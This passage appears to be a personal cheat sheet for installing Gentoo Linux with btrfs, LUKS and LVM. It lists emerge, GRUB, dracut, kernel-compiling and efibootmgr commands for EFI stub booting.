emerge -av sys-fs/btrfs-progs sys-fs/cryptsetup[-static-libs] sys-fs/lvm2[lvm] sys-apps/nvme-cli && rc-update add lvm boot
```
```
grub-install --target=x86_64-efi --efi-directory=/boot

grub-mkconfig -o /boot/grub/grub.cfg
```
```
useradd -m -G users,wheel,audio,video -s /bin/bash gentoober
```

### Install kernel and then:
```
emerge -ac
```
### If gentoo-kernel/gentoo-kernel-bin is used:
```
emerge --config sys-kernel/gentoo-kernel
emerge --config sys-kernel/gentoo-kernel-bin
```
### Testing: 
```
find /lib/modules/<kernel version>/ -type f -iname '*.o' -or -iname '*.ko' | less
```
```
genfstab -U / >> /etc/fstab
```
## BTRFS + LVM MODULES
#### [FILE] /etc/conf.d/modules
```
vim /etc/conf.d/modules
```
##### add:
```
modules="dm_mod btrfs"
```
#### [FILE] /etc/dracut.conf.d/dracut.conf
```
vim /etc/dracut.conf.d/dracut.conf
```
##### add: 
```
add_dracutmodules+=" crypt btrfs dm rootfs-block "
```
#### [FILE] /etc/default/grub
```
vim /etc/default/grub
```
##### Append parameters to the linux kernel command line for non-recovery entries

GRUB_PRELOAD_MODULES="lvm"
GRUB_DISABLE_OS_PROBER="false"
GRUB_DISABLE_LINUX_PARTUUID="false"
GRUB_CMDLINE_LINUX="rd.lvm.vg=gentoober"
GRUB_CMDLINE_LINUX_DEFAULT="rd.lvm rd.lvm.pv=UUID=biO2gV-z07f-nJTP-V1df-5Irt-zohj-ZCu1Nt root=UUID=1cd0761f-c61b-4282-b9d4-338a8f4dcf78"

### ZEN KERNEL
#### remove "mlx5_core" module in order to succefully compile it

## KERNEL COMPILING
```
make mrproper && make clean
```
```
zcat /proc/config.gz > /usr/src/<linux-kernel-version>/.config
```
```
make menuconfig
```
### OR
```
make xconfig # if possible
```
### "Filtering" kernel modules
```
cat .config | grep "=y" | wc -l
```
```
lspci -v | grep "Kernel modules"
```
```
lspci -k
```
```
emerge usbutils -av
```
```
emerge imlib -av 
```
```
lsusb
```
```
make localmodconfig
```
```
cat .config | grep "=y" | wc -l
```
```
make xconfig
```
```
make -j14 && make -j14 modules_install && make install
```
```
dracut --lvm --zstd --kver <linux-kernel-version>
```
#### If using GRUB:
```
grub-mkconfig -o /boot/grub/grub.cfg
```
## EFI STUB

### 1 - Compile the kernel with "kernel_cmd_line=root=UUID=<root_partition>";
### 2 - Create the directories: mkdir -p /boot/EFI/boot;
### 3 - Copy the freshly compiled kernel /boot/vmlinuz-* to /boot/EFI/boot/bootx64.efi;
### 4: Generate initramfs with Dracut (pay close attention to the modules!!!);
### 5: Copy the newly generated initramfs to /boot/efi/boot/<initramfs>.img
### 6: Run:
```
 efibootmgr -c -d /dev/nvme0n1 -p 1 -L "Gentoo (Zen Kernel)" -l "\EFI\boot\bootx64.efi" -u "initrd=\EFI\boot\<initramfs>"
```
